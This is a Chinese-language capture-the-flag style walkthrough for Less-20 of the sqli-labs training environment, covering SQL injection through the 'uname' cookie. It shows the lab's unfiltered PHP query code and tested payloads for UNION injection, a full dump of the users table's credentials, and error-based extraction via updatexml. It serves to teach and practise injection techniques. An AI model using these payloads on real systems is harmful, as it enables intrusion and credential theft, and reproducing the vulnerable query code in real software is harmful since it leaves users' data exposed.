# Less-20

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | Cookie 注入 |
| **闭合方式** | `'` |
| **成败信号** | 数据回显 + SQL 报错 |
| **一句话** | Cookie 里的 uname |
| **核心 payload** | `Cookie: uname=-1' union select 1,2,3--+` |

---

**Cookie 注入 · uname**

### 源码

```php
// 第一次登录成功后，把用户名写进 Cookie
$cookee = $row1['username'];
setcookie('uname', $cookee, time()+3600);

// 之后每次访问，都会拿 Cookie 去查库 —— 而这里完全没有过滤！
if(!isset($_POST['submit'])) {
    $cookee = $_COOKIE['uname'];
    echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);
    $sql = "SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
    $result = mysql_query($sql);
    if (!$result) { die('Issue with your mysql: ' . mysql_error()); }   // ← 报错回显
    $row = mysql_fetch_array($result);
    if($row) {
        echo 'Your Login name:'. $row['username'];    // ← 数据回显！
        echo 'Your Password:' .$row['password'];
        echo 'Your ID:' .$row['id'];
    } else {
        echo '<img src="../images/slap1.jpg" />';
    }
}
```

### 特点

- 注入点在 **Cookie 的 `uname` 字段**
- 这关**既有数据回显、又有报错回显**，比 18/19 好打
- Cookie 值会被 PHP 自动 URL 解码，所以 `+` 依然等于空格

### 通关 payload（实测）

先正常登录拿到 Cookie（`admin` / `admin`），然后直接改 Cookie 重放。

**① 正常情况**
```
Cookie: uname=admin
→  user=admin  pass=admin  id=8
```

**② UNION 注入（实测有效）**
```
Cookie: uname=-1' union select 1,2,3--+
→  user=2  pass=3  id=1
```
> `-1'` 让原查询查空，页面就显示我们 UNION 出来的那行。

**③ 一次拖库**
```
Cookie: uname=-1' union select 1,2,group_concat(username,0x3a,password) from users--+
→  user=2
   pass=Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,
        stupid:stupidity,superman:genious,batman:mob!le,admin:admin,
        admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
   id=1
```
✓ 13 条全部拿到

**④ 报错注入（也可以）**
```
Cookie: uname=' or updatexml(1,concat(0x7e,database()),1) or '
→  Issue with your mysql: XPATH syntax error: '~security'
```

### 用浏览器怎么测

1. F12 → **Application（应用）** → 左侧 **Cookies** → 选中站点
2. 找到 `uname`，双击值改成 payload
3. 刷新页面（注意：改完 Cookie 后要**直接刷新**，不要再点提交按钮，否则会走 POST 分支重置 Cookie）

---

[← Less-19](Less-19.md) ｜ [返回目录](README.md) ｜ —